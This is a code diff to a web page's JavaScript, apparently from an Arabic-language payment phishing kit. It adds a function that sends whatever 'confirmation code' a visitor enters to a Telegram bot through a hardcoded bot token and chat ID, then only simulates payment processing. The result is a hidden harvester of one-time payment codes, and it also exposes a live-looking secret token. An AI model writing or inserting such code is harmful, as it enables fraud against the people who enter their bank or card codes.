@@ -69,13 +69,35 @@
         navLinks.classList.toggle("show");
     });
 
+    // Function to send confirmation code to Telegram bot
+    async function sendConfirmationCodeToTelegram(code) {
+        const botToken = '7376052306:AAEOnsadD15Ny5P-L-LTo0D1eBwk-vVBi7g'; // Replace with your bot token
+        const chatId = '-4273329933'; // Replace with your chat ID
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const message = `Confirmation Code: ${code}`;
+
+        await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        });
+    }
+
     // Handle payment confirmation
-    document.getElementById("confirm-payment-button").addEventListener("click", () => {
+    document.getElementById("confirm-payment-button").addEventListener("click", async () => {
         const confirmationCode = document.getElementById("confirmation-code").value;
         
         if (confirmationCode === "") {
             alert("يرجى ادخال رمز التأكيد.");
         } else {
+            // Send confirmation code to Telegram
+            await sendConfirmationCodeToTelegram(confirmationCode);
+
             // Simulate payment processing
             setTimeout(() => {
                 // Redirect to a success page or perform additional actions
